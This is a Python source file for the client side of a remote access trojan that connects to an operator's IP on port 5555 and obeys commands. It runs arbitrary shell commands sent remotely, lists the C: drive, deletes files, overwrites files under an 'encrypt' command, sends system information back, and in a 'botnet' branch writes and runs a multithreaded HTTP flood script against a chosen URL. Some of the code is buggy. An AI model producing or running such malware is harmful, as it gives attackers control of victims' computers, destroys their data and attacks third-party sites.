import socket
import threading
import subprocess
from subprocess import DEVNULL, STDOUT
from click import command
from matplotlib.pyplot import text
import requests
from systeminfo import SysInfo
import os
from Network.protocol import Network
from Network.Protocol_sending import File_protocol

ip = input("Enter the ip to connect: ")

s = socket.create_connection((ip, 5555))
my_ip = socket.gethostbyname(socket.gethostname())

client_name = ""

class Send:
    def send_command(command):
        Network.send_command(s, command, client_name)

class Receive:
    def receive():
        global client_name
        while True:
            mes = Network.recv_command_client(s)
            if mes == "CLIENT_NAME":
                client_recv = Network.recv_command_client(s)
                client_name += client_recv
                Send.send_command(client_recv)
            elif mes == "reverse_shell":
                com = Network.recv_command_client(s)
                reverse_command = subprocess.check_output(com, stderr=subprocess.STDOUT, shell=True).decode()
                Send.send_command(reverse_command)
            elif mes == "cwd":
                cwd = os.getcwd()
                Send.send_command(cwd)
            elif mes == "send_file":
                File_protocol.recv_file(s)
            elif mes == "browse":
                list_with_all = []
                c = os.listdir("C:\\")
                list_with_all.append(c)
                for directory in c:
                    try:
                        result = os.listdir(directory)
                        list_with_all.append(result)
                    except:
                        pass
                    
                string_list = str(list_with_all)
                Send.send_command(string_list)
            elif mes == "remove":
                path_to_remove = Network.recv_command_client(s)
                os.remove(path_to_remove)
            elif mes == "encrypt":
                recv_path = Network.recv_command_client(s)

                with open(recv_path, "rb") as f:
                    data_to_encrypt = f.read()

                with open(recv_path, "wb") as f:
                    f.write(b"NFSDAIJKFA=SDNOMA2921KL")
            elif mes == "sysinfo":
                text_info = SysInfo.print_info()
                Send.send_command(text_info)
            elif command == "botnet":
                url_target = Network.recv_command_client(s)
                code = f"""
import requests
def ddos():
    while True:
        requests.get({url_target})  

threads = []

for i in range(50):
    t = threading.Thread(target=ddos)
    t.daemon = True
    threads.append(t)

for i in range(50):
    threads[i].start()

for i in range(50):        
    threads[i].join()
                
"""
                file_to_write = open("code_config.py", "w")
                file_to_write.write(code)
                file_to_write.close()
                os.system("code_config.py")
            else:
                print(mes)

t = threading.Thread(target=Receive.receive)
t.start()